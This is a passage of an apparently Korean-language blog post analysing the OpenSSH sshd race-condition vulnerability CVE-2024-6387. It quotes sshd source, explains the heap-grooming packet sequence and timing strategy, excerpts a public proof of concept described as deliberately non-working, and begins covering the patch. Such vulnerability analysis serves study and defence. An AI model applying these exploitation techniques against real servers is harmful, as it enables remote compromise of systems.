		<span class="k">if</span> <span class="p">((</span><span class="o">*</span><span class="n">valp</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="n">len</span> <span class="o">+</span> <span class="mi">1</span><span class="p">))</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
			<span class="n">SSHBUF_DBG</span><span class="p">((</span><span class="s">"SSH_ERR_ALLOC_FAIL"</span><span class="p">));</span>
			<span class="k">return</span> <span class="n">SSH_ERR_ALLOC_FAIL</span><span class="p">;</span>
		<span class="p">}</span>
		<span class="k">if</span> <span class="p">(</span><span class="n">len</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span>
			<span class="n">memcpy</span><span class="p">(</span><span class="o">*</span><span class="n">valp</span><span class="p">,</span> <span class="n">p</span><span class="p">,</span> <span class="n">len</span><span class="p">);</span>
		<span class="p">(</span><span class="o">*</span><span class="n">valp</span><span class="p">)[</span><span class="n">len</span><span class="p">]</span> <span class="o">=</span> <span class="sc">'\0'</span><span class="p">;</span>
	<span class="p">}</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">lenp</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span>
		<span class="o">*</span><span class="n">lenp</span> <span class="o">=</span> <span class="p">(</span><span class="kt">size_t</span><span class="p">)</span><span class="n">len</span><span class="p">;</span>
	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div> <p>위에서 알아본 힙 레이아웃을 달성하기 위해서 <code class="language-plaintext highlighter-rouge">sshd</code>에 다음과 같은 5개의 서로 다른 공개 키 패킷을 전송합니다.</p> <ul> <li>a : <code class="language-plaintext highlighter-rouge">tcache</code> 크기의 청크를 <code class="language-plaintext highlighter-rouge">malloc</code>하고 <code class="language-plaintext highlighter-rouge">free</code>하기 위한 패킷</li> <li>b : 다양한 크기(<code class="language-plaintext highlighter-rouge">~8KB</code>, <code class="language-plaintext highlighter-rouge">320B hole</code>)의 청크를 <code class="language-plaintext highlighter-rouge">malloc</code>하고 <code class="language-plaintext highlighter-rouge">free</code>하여 27개의 <code class="language-plaintext highlighter-rouge">large hole</code>, <code class="language-plaintext highlighter-rouge">small hole</code> 쌍을 만들기 위한 패킷</li> <li>c : 이미 <code class="language-plaintext highlighter-rouge">free</code>된 청크들이 익스플로잇에서 조작된 값을 사용할 수 있게 미리 값들을 세팅해두는 패킷 <ul> <li><code class="language-plaintext highlighter-rouge">remainder</code>의 크기를 크게 만들 가짜 헤더를 중간에 기록</li> <li><code class="language-plaintext highlighter-rouge">glibc</code>의 보안 검사를 통과하기 위한 <code class="language-plaintext highlighter-rouge">footer</code>를 <code class="language-plaintext highlighter-rouge">small hole</code> 끝 부분에 기록</li> <li><code class="language-plaintext highlighter-rouge">fake vtable</code>과 <code class="language-plaintext highlighter-rouge">_codecvt</code> 포인터를 <code class="language-plaintext highlighter-rouge">small hole</code>에 기록</li> </ul> </li> <li>d : 앞서<code class="language-plaintext highlighter-rouge"> free</code>한 청크들이 <code class="language-plaintext highlighter-rouge">unsorted bin</code>에서 각각의 <code class="language-plaintext highlighter-rouge">large bin</code>과 <code class="language-plaintext highlighter-rouge">small bin</code>에 배치될 수 있도록 하는 패킷</li> <li>e : 27개의 쌍을 이용해 레이스 컨디션을 수행하기 위한 패킷(앞서 알아본 힙 레이아웃 조작을 위한 시퀀스 수행 : <code class="language-plaintext highlighter-rouge">malloc(~4KB)</code>, <code class="language-plaintext highlighter-rouge">malloc(304)</code>, <code class="language-plaintext highlighter-rouge">malloc(~4KB), malloc(304))</code></li> </ul> <h4 id="timing-strategy"> <a href="#timing-strategy" class="anchor-head"></a> Timing strategy </h4> <p>여러 제약 사항 때문에 결과적으로 다음과 같은 함수에서 시간을 측정하여 패킷 전송 타이밍을 맞추게됩니다.</p> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="mi">88</span> <span class="nf">userauth_pubkey</span><span class="p">(</span><span class="k">struct</span> <span class="n">ssh</span> <span class="o">*</span><span class="n">ssh</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">method</span><span class="p">)</span>
 <span class="mi">89</span> <span class="p">{</span>
<span class="p">...</span>
<span class="mi">138</span>         <span class="k">if</span> <span class="p">(</span><span class="n">pktype</span> <span class="o">==</span> <span class="n">KEY_UNSPEC</span><span class="p">)</span> <span class="p">{</span>
<span class="mi">139</span>                 <span class="cm">/* this is perfectly legal */</span>
<span class="mi">140</span>                 <span class="n">verbose_f</span><span class="p">(</span><span class="s">"unsupported public key algorithm: %s"</span><span class="p">,</span> <span class="n">pkalg</span><span class="p">);</span>
<span class="mi">141</span>                 <span class="k">goto</span> <span class="n">done</span><span class="p">;</span>
<span class="mi">142</span>         <span class="p">}</span>
<span class="mi">143</span>         <span class="nf">if</span> <span class="p">((</span><span class="n">r</span> <span class="o">=</span> <span class="n">sshkey_from_blob</span><span class="p">(</span><span class="n">pkblob</span><span class="p">,</span> <span class="n">blen</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">key</span><span class="p">))</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
<span class="mi">144</span>                 <span class="n">error_fr</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="s">"parse key"</span><span class="p">);</span>
<span class="mi">145</span>                 <span class="k">goto</span> <span class="n">done</span><span class="p">;</span>
<span class="mi">146</span>         <span class="p">}</span>
<span class="p">...</span>
<span class="mi">151</span>         <span class="nf">if</span> <span class="p">(</span><span class="n">key</span><span class="o">-&gt;</span><span class="n">type</span> <span class="o">!=</span> <span class="n">pktype</span><span class="p">)</span> <span class="p">{</span>
<span class="mi">152</span>                 <span class="n">error_f</span><span class="p">(</span><span class="s">"type mismatch for decoded key "</span>
<span class="mi">153</span>                     <span class="s">"(received %d, expected %d)"</span><span class="p">,</span> <span class="n">key</span><span class="o">-&gt;</span><span class="n">type</span><span class="p">,</span> <span class="n">pktype</span><span class="p">);</span>
<span class="mi">154</span>                 <span class="k">goto</span> <span class="n">done</span><span class="p">;</span>
<span class="mi">155</span>         <span class="p">}</span>
</code></pre></div></div> <ul> <li>공개 키 패킷 중 <code class="language-plaintext highlighter-rouge">pktype</code>에 오류가 발생하게끔 데이터를 설정해 138~142행에서 패킷 오류가 발생하게 합니다.</li> <li>두 번째로 공개 키 패킷 중 <code class="language-plaintext highlighter-rouge">key-&gt;type</code>에 오류가 발생하게끔 데이터를 설정해 151~155행에서 패킷 오류가 발생하게 합니다.</li> <li>이때 143행에 존재하는 <code class="language-plaintext highlighter-rouge">sshkey_from_blob</code>은 공개키를 파싱하는 함수로 위에서 알아본 양옆에있는 두 함수의 응답 시간의 차가 <code class="language-plaintext highlighter-rouge">sshd</code>가 공개 키를 파싱하는 데 걸리는 시간이 됩니다.</li> <li>이를 통해 마지막 패킷의 전송시간을 조절합니다.</li> </ul> <p><code class="language-plaintext highlighter-rouge">sshkey_from_blob</code>은 다음과 같은 흐름으로 <code class="language-plaintext highlighter-rouge">cert_parse</code>를 호출합니다.</p> <details> <summary>sshkey.c:sshkey_from_blob</summary> <div> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span>
<span class="nf">sshkey_from_blob</span><span class="p">(</span><span class="k">const</span> <span class="n">u_char</span> <span class="o">*</span><span class="n">blob</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">blen</span><span class="p">,</span> <span class="k">struct</span> <span class="n">sshkey</span> <span class="o">**</span><span class="n">keyp</span><span class="p">)</span>
<span class="p">{</span>
	<span class="k">struct</span> <span class="n">sshbuf</span> <span class="o">*</span><span class="n">b</span><span class="p">;</span>
	<span class="kt">int</span> <span class="n">r</span><span class="p">;</span>

	<span class="k">if</span> <span class="p">((</span><span class="n">b</span> <span class="o">=</span> <span class="n">sshbuf_from</span><span class="p">(</span><span class="n">blob</span><span class="p">,</span> <span class="n">blen</span><span class="p">))</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
		<span class="k">return</span> <span class="n">SSH_ERR_ALLOC_FAIL</span><span class="p">;</span>
	<span class="n">r</span> <span class="o">=</span> <span class="n">sshkey_from_blob_internal</span><span class="p">(</span><span class="n">b</span><span class="p">,</span> <span class="n">keyp</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
	<span class="n">sshbuf_free</span><span class="p">(</span><span class="n">b</span><span class="p">);</span>
	<span class="k">return</span> <span class="n">r</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div> </div> </div> </details> <details> <summary>sshkey.c:sshkey_from_blob_internal</summary> <div> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="kt">int</span>
<span class="nf">sshkey_from_blob_internal</span><span class="p">(</span><span class="k">struct</span> <span class="n">sshbuf</span> <span class="o">*</span><span class="n">b</span><span class="p">,</span> <span class="k">struct</span> <span class="n">sshkey</span> <span class="o">**</span><span class="n">keyp</span><span class="p">,</span>
    <span class="kt">int</span> <span class="n">allow_cert</span><span class="p">)</span>
<span class="p">{</span>
	<span class="kt">int</span> <span class="n">type</span><span class="p">,</span> <span class="n">ret</span> <span class="o">=</span> <span class="n">SSH_ERR_INTERNAL_ERROR</span><span class="p">;</span>
	<span class="kt">char</span> <span class="o">*</span><span class="n">ktype</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
	<span class="k">struct</span> <span class="n">sshkey</span> <span class="o">*</span><span class="n">key</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
	<span class="k">struct</span> <span class="n">sshbuf</span> <span class="o">*</span><span class="n">copy</span><span class="p">;</span>
	<span class="k">const</span> <span class="k">struct</span> <span class="n">sshkey_impl</span> <span class="o">*</span><span class="n">impl</span><span class="p">;</span>

<span class="cp">#ifdef DEBUG_PK </span><span class="cm">/* XXX */</span><span class="cp">
</span>	<span class="n">sshbuf_dump</span><span class="p">(</span><span class="n">b</span><span class="p">,</span> <span class="n">stderr</span><span class="p">);</span>
<span class="cp">#endif
</span>	<span class="k">if</span> <span class="p">(</span><span class="n">keyp</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span>
		<span class="o">*</span><span class="n">keyp</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
	<span class="k">if</span> <span class="p">((</span><span class="n">copy</span> <span class="o">=</span> <span class="n">sshbuf_fromb</span><span class="p">(</span><span class="n">b</span><span class="p">))</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
		<span class="n">ret</span> <span class="o">=</span> <span class="n">SSH_ERR_ALLOC_FAIL</span><span class="p">;</span>
		<span class="k">goto</span> <span class="n">out</span><span class="p">;</span>
	<span class="p">}</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">sshbuf_get_cstring</span><span class="p">(</span><span class="n">b</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ktype</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
		<span class="n">ret</span> <span class="o">=</span> <span class="n">SSH_ERR_INVALID_FORMAT</span><span class="p">;</span>
		<span class="k">goto</span> <span class="n">out</span><span class="p">;</span>
	<span class="p">}</span>

	<span class="n">type</span> <span class="o">=</span> <span class="n">sshkey_type_from_name</span><span class="p">(</span><span class="n">ktype</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">allow_cert</span> <span class="o">&amp;&amp;</span> <span class="n">sshkey_type_is_cert</span><span class="p">(</span><span class="n">type</span><span class="p">))</span> <span class="p">{</span>
		<span class="n">ret</span> <span class="o">=</span> <span class="n">SSH_ERR_KEY_CERT_INVALID_SIGN_KEY</span><span class="p">;</span>
		<span class="k">goto</span> <span class="n">out</span><span class="p">;</span>
	<span class="p">}</span>
	<span class="k">if</span> <span class="p">((</span><span class="n">impl</span> <span class="o">=</span> <span class="n">sshkey_impl_from_type</span><span class="p">(</span><span class="n">type</span><span class="p">))</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
		<span class="n">ret</span> <span class="o">=</span> <span class="n">SSH_ERR_KEY_TYPE_UNKNOWN</span><span class="p">;</span>
		<span class="k">goto</span> <span class="n">out</span><span class="p">;</span>
	<span class="p">}</span>
	<span class="k">if</span> <span class="p">((</span><span class="n">key</span> <span class="o">=</span> <span class="n">sshkey_new</span><span class="p">(</span><span class="n">type</span><span class="p">))</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
		<span class="n">ret</span> <span class="o">=</span> <span class="n">SSH_ERR_ALLOC_FAIL</span><span class="p">;</span>
		<span class="k">goto</span> <span class="n">out</span><span class="p">;</span>
	<span class="p">}</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">sshkey_type_is_cert</span><span class="p">(</span><span class="n">type</span><span class="p">))</span> <span class="p">{</span>
		<span class="cm">/* Skip nonce that preceeds all certificates */</span>
		<span class="k">if</span> <span class="p">(</span><span class="n">sshbuf_get_string_direct</span><span class="p">(</span><span class="n">b</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
			<span class="n">ret</span> <span class="o">=</span> <span class="n">SSH_ERR_INVALID_FORMAT</span><span class="p">;</span>
			<span class="k">goto</span> <span class="n">out</span><span class="p">;</span>
		<span class="p">}</span>
	<span class="p">}</span>
	<span class="k">if</span> <span class="p">((</span><span class="n">ret</span> <span class="o">=</span> <span class="n">impl</span><span class="o">-&gt;</span><span class="n">funcs</span><span class="o">-&gt;</span><span class="n">deserialize_public</span><span class="p">(</span><span class="n">ktype</span><span class="p">,</span> <span class="n">b</span><span class="p">,</span> <span class="n">key</span><span class="p">))</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span>
		<span class="k">goto</span> <span class="n">out</span><span class="p">;</span>

	<span class="cm">/* Parse certificate potion */</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">sshkey_is_cert</span><span class="p">(</span><span class="n">key</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">ret</span> <span class="o">=</span> <span class="n">cert_parse</span><span class="p">(</span><span class="n">b</span><span class="p">,</span> <span class="n">key</span><span class="p">,</span> <span class="n">copy</span><span class="p">))</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span>
		<span class="k">goto</span> <span class="n">out</span><span class="p">;</span>

	<span class="k">if</span> <span class="p">(</span><span class="n">key</span> <span class="o">!=</span> <span class="nb">NULL</span> <span class="o">&amp;&amp;</span> <span class="n">sshbuf_len</span><span class="p">(</span><span class="n">b</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
		<span class="n">ret</span> <span class="o">=</span> <span class="n">SSH_ERR_INVALID_FORMAT</span><span class="p">;</span>
		<span class="k">goto</span> <span class="n">out</span><span class="p">;</span>
	<span class="p">}</span>
	<span class="n">ret</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">keyp</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
		<span class="o">*</span><span class="n">keyp</span> <span class="o">=</span> <span class="n">key</span><span class="p">;</span>
		<span class="n">key</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
	<span class="p">}</span>
 <span class="nl">out:</span>
	<span class="n">sshbuf_free</span><span class="p">(</span><span class="n">copy</span><span class="p">);</span>
	<span class="n">sshkey_free</span><span class="p">(</span><span class="n">key</span><span class="p">);</span>
	<span class="n">free</span><span class="p">(</span><span class="n">ktype</span><span class="p">);</span>
	<span class="k">return</span> <span class="n">ret</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div> </div> </div> </details> <p>사실상 위에서 알아본 제약 사항 때문에 해당 취약점을 이용하는 것은 많이 힘들어보입니다. 또한 환경에 대한 제약 역시 큽니다. 이제 PoC를 확인해봅시다.</p> <h1 id="poc-analysis"> <a href="#poc-analysis" class="anchor-head"></a> PoC Analysis </h1> <p><a href="https://github.com/lflare/cve-2024-6387-poc/tree/master">PoC</a>가 현재 공개된 상태지만 의도적으로 해당 PoC는 작동하지않게 작성되어있습니다.</p> <p align="center"><img width="100%" src="/assets/img/CVE-2024-6387/commit_history.png" /></p> <p><br /></p> <p>PoC는 앞서 알아본 다음과 같은 순서로 패킷을 전송합니다.</p> <ul> <li>a : <code class="language-plaintext highlighter-rouge">tcache</code> 크기의 청크를 <code class="language-plaintext highlighter-rouge">malloc</code>하고 <code class="language-plaintext highlighter-rouge">free</code>하기 위한 패킷</li> <li>b : 다양한 크기(<code class="language-plaintext highlighter-rouge">~8KB</code>, <code class="language-plaintext highlighter-rouge">320B hole</code>)의 청크를 <code class="language-plaintext highlighter-rouge">malloc</code>하고 <code class="language-plaintext highlighter-rouge">free</code>하여 27개의 <code class="language-plaintext highlighter-rouge">large hole</code>, <code class="language-plaintext highlighter-rouge">small hole</code> 쌍을 만들기 위한 패킷</li> <li>c : 이미 <code class="language-plaintext highlighter-rouge">free</code>된 청크들이 익스플로잇에서 조작된 값을 사용할 수 있게 미리 값들을 세팅해두는 패킷 <ul> <li><code class="language-plaintext highlighter-rouge">remainder</code>의 크기를 크게 만들 가짜 헤더를 중간에 기록</li> <li><code class="language-plaintext highlighter-rouge">glibc</code>의 보안 검사를 통과하기 위한 <code class="language-plaintext highlighter-rouge">footer</code>를 <code class="language-plaintext highlighter-rouge">small hole</code> 끝 부분에 기록</li> <li><code class="language-plaintext highlighter-rouge">fake vtable</code>과 <code class="language-plaintext highlighter-rouge">_codecvt</code> 포인터를 <code class="language-plaintext highlighter-rouge">small hole</code>에 기록</li> </ul> </li> <li>d : 앞서 <code class="language-plaintext highlighter-rouge">free</code>한 청크들이 <code class="language-plaintext highlighter-rouge">unsorted bin</code>에서 각각의 <code class="language-plaintext highlighter-rouge">large bin</code>과 <code class="language-plaintext highlighter-rouge">small bin</code>에 배치될 수 있도록 하는 패킷</li> <li>e : 27개의 쌍을 이용해 레이스 컨디션을 수행하기 위한 패킷(앞서 알아본 힙 레이아웃 조작을 위한 시퀀스 수행 : <code class="language-plaintext highlighter-rouge">malloc(~4KB)</code>, <code class="language-plaintext highlighter-rouge">malloc(304)</code>, <code class="language-plaintext highlighter-rouge">malloc(~4KB), malloc(304))</code></li> </ul> <p>PoC에서 역시 <code class="language-plaintext highlighter-rouge">glibc</code>를 다음과 같은 두 개의 주소중 하나라고 가정합니다.</p> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// Possible glibc base addresses (for ASLR bypass)</span>
<span class="kt">uint64_t</span> <span class="n">GLIBC_BASES</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span> <span class="mh">0xb7200000</span><span class="p">,</span> <span class="mh">0xb7400000</span> <span class="p">};</span>
<span class="kt">int</span> <span class="n">NUM_GLIBC_BASES</span> <span class="o">=</span> <span class="k">sizeof</span> <span class="p">(</span><span class="n">GLIBC_BASES</span><span class="p">)</span> <span class="o">/</span> <span class="k">sizeof</span> <span class="p">(</span><span class="n">GLIBC_BASES</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
</code></pre></div></div> <p><code class="language-plaintext highlighter-rouge">main</code> 함수의 핵심적인 부분을 살펴봅시다.</p> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span>
<span class="nf">main</span> <span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span>
<span class="p">{</span>
  <span class="p">...</span>
          <span class="n">prepare_heap</span> <span class="p">(</span><span class="n">sock</span><span class="p">);</span>
          <span class="n">time_final_packet</span> <span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">parsing_time</span><span class="p">);</span>

          <span class="k">if</span> <span class="p">(</span><span class="n">attempt_race_condition</span> <span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="n">parsing_time</span><span class="p">,</span> <span class="n">glibc_base</span><span class="p">))</span>
            <span class="p">{</span>
              <span class="n">printf</span> <span class="p">(</span><span class="s">"Possible exploitation success on attempt %d with glibc "</span>
                      <span class="s">"base 0x%lx!</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span>
                      <span class="n">attempt</span><span class="p">,</span> <span class="n">glibc_base</span><span class="p">);</span>
              <span class="n">success</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
              <span class="k">break</span><span class="p">;</span>
            <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div> <p>위에 나타난 함수들 중 <code class="language-plaintext highlighter-rouge">prepare_heap</code> 함수에서 a~d의 역할을 하는 패킷들이 전송됩니다.</p> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span>
<span class="nf">prepare_heap</span> <span class="p">(</span><span class="kt">int</span> <span class="n">sock</span><span class="p">)</span>
<span class="p">{</span>
  <span class="c1">// Packet a: Allocate and free tcache chunks</span>
  <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">10</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
    <span class="p">{</span>
      <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">tcache_chunk</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
      <span class="n">memset</span> <span class="p">(</span><span class="n">tcache_chunk</span><span class="p">,</span> <span class="sc">'A'</span><span class="p">,</span> <span class="k">sizeof</span> <span class="p">(</span><span class="n">tcache_chunk</span><span class="p">));</span>
      <span class="n">send_packet</span> <span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="n">tcache_chunk</span><span class="p">,</span> <span class="k">sizeof</span> <span class="p">(</span><span class="n">tcache_chunk</span><span class="p">));</span>
      <span class="c1">// These will be freed by the server, populating tcache</span>
    <span class="p">}</span>

  <span class="c1">// Packet b: Create 27 pairs of large (~8KB) and small (320B) holes</span>
  <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">27</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
    <span class="p">{</span>
      <span class="c1">// Allocate large chunk (~8KB)</span>
      <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">large_hole</span><span class="p">[</span><span class="mi">8192</span><span class="p">];</span>
      <span class="n">memset</span> <span class="p">(</span><span class="n">large_hole</span><span class="p">,</span> <span class="sc">'B'</span><span class="p">,</span> <span class="k">sizeof</span> <span class="p">(</span><span class="n">large_hole</span><span class="p">));</span>
      <span class="n">send_packet</span> <span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="n">large_hole</span><span class="p">,</span> <span class="k">sizeof</span> <span class="p">(</span><span class="n">large_hole</span><span class="p">));</span>

      <span class="c1">// Allocate small chunk (320B)</span>
      <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">small_hole</span><span class="p">[</span><span class="mi">320</span><span class="p">];</span>
      <span class="n">memset</span> <span class="p">(</span><span class="n">small_hole</span><span class="p">,</span> <span class="sc">'C'</span><span class="p">,</span> <span class="k">sizeof</span> <span class="p">(</span><span class="n">small_hole</span><span class="p">));</span>
      <span class="n">send_packet</span> <span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="n">small_hole</span><span class="p">,</span> <span class="k">sizeof</span> <span class="p">(</span><span class="n">small_hole</span><span class="p">));</span>
    <span class="p">}</span>

  <span class="c1">// Packet c: Write fake headers, footers, vtable and _codecvt pointers</span>
  <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">27</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
    <span class="p">{</span>
      <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">fake_data</span><span class="p">[</span><span class="mi">4096</span><span class="p">];</span>
      <span class="n">create_fake_file_structure</span> <span class="p">(</span><span class="n">fake_data</span><span class="p">,</span> <span class="k">sizeof</span> <span class="p">(</span><span class="n">fake_data</span><span class="p">),</span>
                                  <span class="n">GLIBC_BASES</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
      <span class="n">send_packet</span> <span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="n">fake_data</span><span class="p">,</span> <span class="k">sizeof</span> <span class="p">(</span><span class="n">fake_data</span><span class="p">));</span>
    <span class="p">}</span>

  <span class="c1">// Packet d: Ensure holes are in correct malloc bins (send ~256KB string)</span>
  <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">large_string</span><span class="p">[</span><span class="n">MAX_PACKET_SIZE</span> <span class="o">-</span> <span class="mi">1</span><span class="p">];</span>
  <span class="n">memset</span> <span class="p">(</span><span class="n">large_string</span><span class="p">,</span> <span class="sc">'E'</span><span class="p">,</span> <span class="k">sizeof</span> <span class="p">(</span><span class="n">large_string</span><span class="p">));</span>
  <span class="n">send_packet</span> <span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="n">large_string</span><span class="p">,</span> <span class="k">sizeof</span> <span class="p">(</span><span class="n">large_string</span><span class="p">));</span>
<span class="p">}</span>
</code></pre></div></div> <p><code class="language-plaintext highlighter-rouge">prepare_heap</code>이 완료되면 <code class="language-plaintext highlighter-rouge">time_final_paket</code> 함수를 통해서 공개키가 파싱되는 타이밍을 알아냅니다.</p> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span>
<span class="nf">time_final_packet</span> <span class="p">(</span><span class="kt">int</span> <span class="n">sock</span><span class="p">,</span> <span class="kt">double</span> <span class="o">*</span><span class="n">parsing_time</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">double</span> <span class="n">time_before</span> <span class="o">=</span> <span class="n">measure_response_time</span> <span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
  <span class="kt">double</span> <span class="n">time_after</span> <span class="o">=</span> <span class="n">measure_response_time</span> <span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span>
  <span class="o">*</span><span class="n">parsing_time</span> <span class="o">=</span> <span class="n">time_after</span> <span class="o">-</span> <span class="n">time_before</span><span class="p">;</span>

  <span class="n">printf</span> <span class="p">(</span><span class="s">"Estimated parsing time: %.6f seconds</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="o">*</span><span class="n">parsing_time</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div> <p>위에서 알아낸 타이밍을 기반으로 레이스 컨디션을 수행합니다.</p> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">...</span>
<span class="n">attempt_race_condition</span> <span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="n">parsing_time</span><span class="p">,</span> <span class="n">glibc_base</span><span class="p">)</span>
<span class="p">...</span>
</code></pre></div></div> <h1 id="patch"> <a href="#patch" class="anchor-head"></a> Patch </h1> <p><code class="language-plaintext highlighter-rouge">sshd.c</code>에 위치한 <a href="https://github.com/openssh/openssh-portable/blob/V_9_7/sshd.c#L353">grace_alarm_handler</a> 함수가 <code class="language-plaintext highlighter-rouge">sshd-session.c</code>로 옮겨가며 다음과 같이 코드가 수정되었습니다.</p> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/*
 * Signal handler for the alarm after the login grace period has expired.
 * As usual, this may only take signal-safe actions, even though it is
 * terminal.
 */</span>
<span class="k">static</span> <span class="kt">void</span>
<span class="nf">grace_alarm_handler</span><span class="p">(</span><span class="kt">int</span> <span class="n">sig</span><span class="p">)</span>
<span class="p">{</span>
	<span class="cm">/*
	 * Try to kill any processes that we have spawned, E.g. authorized
	 * keys command helpers or privsep children.
	 */</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">getpgid</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">==</span> <span class="n">getpid</span><span class="p">())</span> <span class="p">{</span>
		<span class="k">struct</span> <span class="n">sigaction</span> <span class="n">sa</span><span class="p">;</span>

		<span class="cm">/* mask all other signals while in handler */</span>
		<span class="n">memset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">sa</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">sa</span><span class="p">));</span>
		<span class="n">sa</span><span class="p">.</span><span class="n">sa_handler</span> <span class="o">=</span> <span class="n">SIG_IGN</span><span class="p">;</span>
		<span class="n">sigfillset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">sa</span><span class="p">.</span><span class="n">sa_mask</span><span class="p">);</span>
		<span class="n">sa</span><span class="p">.</span><span class="n">sa_flags</span> <span class="o">=</span> <span class="n">SA_RESTART</span><span class="p">;</span>
